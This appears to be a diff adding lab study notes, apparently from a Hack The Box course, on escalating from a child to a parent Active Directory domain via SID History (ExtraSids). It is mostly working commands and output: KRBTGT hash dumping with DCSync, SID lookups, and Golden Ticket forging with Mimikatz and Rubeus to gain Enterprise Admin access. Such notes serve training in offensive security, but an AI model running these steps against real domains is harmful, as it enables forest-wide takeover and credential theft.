@@ -2895,3 +2895,107 @@ C:\htb> netdom query /domain:inlanefreight.local workstation
 - Use the "Map Domain Trusts" pre-built query to visualize domain trust relationships.
 
 By understanding and carefully managing domain trusts, organizations can improve their security posture and reduce the risk of attacks exploiting these trust relationships.
+
+
+# Attacking Domain Trusts - Child -> Parent Trusts - from Windows
+
+### SID History Primer
+- **Purpose**: Used in migrations to ensure users can access resources in the original domain after being moved to a new domain.
+- **Attribute**: `sidHistory` stores the original user's SID in the new account's attribute.
+
+### SID History Injection Attack
+- **Tool**: Mimikatz
+- **Goal**: Add an admin SID to `sidHistory` of a controlled account.
+- **Result**: Grants the account administrative privileges and allows for DCSync attacks, creating Golden Tickets.
+
+### ExtraSids Attack
+- **Target**: Parent domain after compromising a child domain.
+- **Vulnerability**: Lack of SID Filtering within the same AD forest.
+- **Objective**: Use `sidHistory` to gain Enterprise Admin rights.
+
+### Data Needed for ExtraSids Attack
+1. KRBTGT hash for the child domain
+2. SID for the child domain
+3. Target user name in the child domain (can be fake)
+4. FQDN of the child domain
+5. SID of the Enterprise Admins group in the root domain
+
+### Steps to Perform the Attack
+1. **Obtain NT hash for KRBTGT account**:
+   ```powershell
+   mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+   ```
+
+2. **Get SID for the child domain**:
+   ```powershell
+   PS C:\htb> Get-DomainSID
+   ```
+
+3. **Get SID for the Enterprise Admins group**:
+   ```powershell
+   PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+   ```
+
+4. **Create a Golden Ticket with Mimikatz**:
+   ```powershell
+   mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+   ```
+
+5. **Confirm Kerberos ticket is in memory**:
+   ```powershell
+   PS C:\htb> klist
+   ```
+
+### Example Before and After Attack
+**Before Attack**:
+```powershell
+PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
+ls : Access is denied
+```
+
+**After Attack**:
+```powershell
+PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
+ Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
+ Directory of \\academy-ea-dc01.inlanefreight.local\c$
+```
+
+### Rubeus Alternative
+- Use Rubeus to perform the attack similarly, by formulating the Rubeus command with the required data.
+
+### Data Needed
+1. **KRBTGT hash** for the child domain: `9d765b482771505cbe97411065964d5f`
+2. **SID** for the child domain: `S-1-5-21-2806153819-209893948-922872689`
+3. **Target user name** in the child domain: `hacker` (can be fake)
+4. **FQDN** of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
+5. **SID of the Enterprise Admins group** in the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`
+
+### Steps to Perform the Attack
+
+1. **Create a Golden Ticket with Rubeus:**
+   ```powershell
+   PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+   ```
+
+2. **Output from Rubeus:**
+   ```
+   [*] Action: Build TGT
+   [*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'
+   [+] Ticket successfully imported!
+   ```
+
+3. **Confirm the Ticket is in Memory Using klist:**
+   ```powershell
+   PS C:\htb> klist
+   ```
+
+4. **Perform a DCSync Attack to Verify Access:**
+   ```powershell
+   PS C:\Tools\mimikatz\x64> .\mimikatz.exe
+   mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+   ```
+
+
+**Notes:**
+- The Rubeus command `/rc4` flag is the NT hash for the KRBTGT account.
+- The `/sids` flag will tell Rubeus to create a Golden Ticket granting the same rights as members of the Enterprise Admins group in the parent domain.
